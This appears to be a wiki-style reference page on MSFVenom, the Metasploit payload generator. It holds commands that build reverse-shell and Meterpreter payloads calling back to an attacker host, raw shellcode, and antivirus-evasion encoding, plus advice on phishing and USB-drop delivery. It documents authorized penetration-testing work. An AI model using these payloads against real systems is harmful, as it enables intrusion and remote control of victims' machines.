## Overview
MSFVenom is a powerful payload generator and encoder tool that is part of the Metasploit Framework. It is used by penetration testers, ethical hackers, and security researchers to create and customize payloads that can be used in exploits or delivered via social engineering. MSFVenom allows users to generate a wide variety of payloads for different platforms, including Windows, Linux, macOS, Android, and iOS. It can also encode payloads to bypass antivirus (AV) and intrusion detection systems (IDS).

MSFVenom combines the functionality of two older Metasploit tools, `msfpayload` and `msfencode`, making it a comprehensive tool for creating and encoding payloads for various attack vectors.

## Features
- **Payload Generation:** Creates payloads for different platforms, including Windows, Linux, macOS, Android, and iOS.
- **Encoding and Obfuscation:** Encodes payloads to bypass AV and IDS/IPS systems.
- **Customizable Payloads:** Allows customization of payloads with specific options such as LHOST, LPORT, and additional parameters.
- **Multi-Format Output:** Supports multiple output formats, including executables, scripts, shellcode, raw binaries, and more.
- **Cross-Platform Support:** Available on Unix-based systems (Linux, macOS) and Windows environments as part of the Metasploit Framework.

## Website
- [Metasploit Framework GitHub Repository](https://github.com/rapid7/metasploit-framework)

## Installation

### On Unix-based systems (Linux/macOS):

1. **Install MSFVenom via Metasploit Framework:**

   - MSFVenom is included with the Metasploit Framework. To install Metasploit on Debian-based systems:

```sh
sudo apt-get install metasploit-framework
```

   - **On macOS using Homebrew:**

```sh
brew install metasploit
```

2. **Run MSFVenom:**

   - MSFVenom can be run directly from the command line after installing the Metasploit Framework:

```sh
msfvenom
```

### On Windows:

1. **Install MSFVenom via Metasploit Framework:**

   - Download the Metasploit installer from the [Rapid7 website](https://www.metasploit.com/download).

2. **Run the Installer:**

   - Follow the instructions provided by the installer to complete the installation process.

3. **Run MSFVenom:**

   - Open the command prompt or PowerShell and navigate to the Metasploit installation directory, then run:

```cmd
msfvenom
```

## Basic Usage
MSFVenom is a versatile tool with many options for creating and encoding payloads. Here are some common commands and usage examples:

### Generate a Basic Payload
To generate a basic Windows reverse shell payload:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o shell.exe
```

- **`-p windows/meterpreter/reverse_tcp`**: Specifies the payload type (Windows Meterpreter reverse TCP shell).
- **`LHOST=<attacker-ip>`**: Sets the IP address of the attacker (listener).
- **`LPORT=4444`**: Sets the port number on which the payload will connect back.
- **`-f exe`**: Specifies the output format as a Windows executable.
- **`-o shell.exe`**: Specifies the output file name.

### Generate a Payload for Linux
To generate a Linux reverse shell payload:

```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f elf -o shell.elf
```

- **`-p linux/x86/meterpreter/reverse_tcp`**: Specifies the payload type (Linux Meterpreter reverse TCP shell).
- **`-f elf`**: Specifies the output format as a Linux ELF binary.

### Generate a Payload for macOS
To generate a macOS reverse shell payload:

```sh
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f macho -o shell.macho
```

- **`-p osx/x86/shell_reverse_tcp`**: Specifies the payload type (macOS reverse TCP shell).
- **`-f macho`**: Specifies the output format as a macOS Mach-O binary.

### Encode a Payload
To encode a payload using a specific encoder to bypass antivirus:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell_encoded.exe
```

- **`-e x86/shikata_ga_nai`**: Specifies the encoder to use (Shikata Ga Nai, a polymorphic XOR additive feedback encoder).

### List Available Payloads
To list all available payloads in MSFVenom:

```sh
msfvenom -l payloads
```

- **`-l payloads`**: Lists all available payloads in the Metasploit Framework.

### List Available Encoders
To list all available encoders in MSFVenom:

```sh
msfvenom -l encoders
```

- **`-l encoders`**: Lists all available encoders.

### Generate Shellcode
To generate raw shellcode for injection purposes:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f raw -o shellcode.bin
```

- **`-f raw`**: Specifies the output format as raw shellcode.

## Key Features and Options

### Payload Generation
- **Description:** Creates payloads for various platforms, including Windows, Linux, macOS, Android, and iOS, to be used in exploits and social engineering.
- **Usage:**
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o shell.exe
```

### Encoding and Obfuscation
- **Description:** Encodes payloads using different encoders to bypass antivirus and intrusion detection systems.
- **Usage:**
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell_encoded.exe
```

### Multi-Format Output
- **Description:** Supports multiple output formats, including executables, scripts, shellcode, raw binaries, and more.
- **Usage:**
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f elf -o shell.elf
```

### Customizable Payloads
- **Description:** Allows customization of payloads with specific options, such as IP addresses, ports, and additional parameters for advanced exploitation.
- **Usage:**
```sh
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f macho -o shell.macho
```

### Listing Payloads and Encoders
- **Description:** Lists all available payloads and encoders in the Metasploit Framework to help users choose the most appropriate ones for their attack scenarios.
- **Usage:**
```sh
msfvenom -l payloads
msfvenom -l encoders
```

## Tools for Payload Generation and Encoding Using MSFVenom

- **Exploitation and Social Engineering:** Use MSFVenom to generate payloads that can be delivered via exploits, phishing emails, or USB drops to compromise target systems.
- **Antivirus and IDS/IPS Evasion:** Encode payloads with different encoders to evade antivirus software and intrusion detection/prevention systems.
- **Shellcode Injection:** Generate raw shellcode for injection into processes or for use in custom exploits and payload delivery methods.
- **Cross-Platform Attacks:** Create payloads for multiple operating systems, including Windows, Linux, macOS, Android, and iOS, to target a wide range of environments.
- **Integration with Metasploit:** Use MSFVenom-generated payloads in conjunction with the Metasploit Framework to exploit vulnerabilities and maintain control over compromised systems.

## Best Practices
- **Use MSFVenom Responsibly:** Always ensure that you have proper authorization before using MSFVenom-generated payloads for offensive security tasks.
- **Regularly Update Metasploit Framework:** Keep Metasploit and MSFVenom up-to-date to benefit from the latest payloads, encoders, and security enhancements.
- **Test Payloads Carefully:** Test generated payloads in a controlled environment before deploying them in real-world scenarios to ensure they work as expected and do not trigger defenses.
- **Combine with Other Tools:** Use MSFVenom alongside other post-exploitation tools like [[Metasploit]], [[Empire]], and [[Cobalt Strike]] for comprehensive assessments.
- **Analyze Encoding Options:** Experiment with different encoders and encoding iterations to achieve maximum evasion and effectiveness against antivirus and IDS/IPS.

## References
- [Metasploit Framework GitHub Repository](https://github.com/rapid7/metasploit-framework)
- [MSFVenom Payload Creator (MSFPC)](https://github.com/g0tmi1k/msfpc)
- [MSFVenom Cheat Sheet](https://highon.coffee/blog/msfvenom-cheat-sheet/)
- [Using MSFVenom for Payload Generation](https://null-byte.wonderhowto.com/how-to/use-msfvenom-generate-cross-platform-payloads-0197598/)
- [Metasploit Unleashed: MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

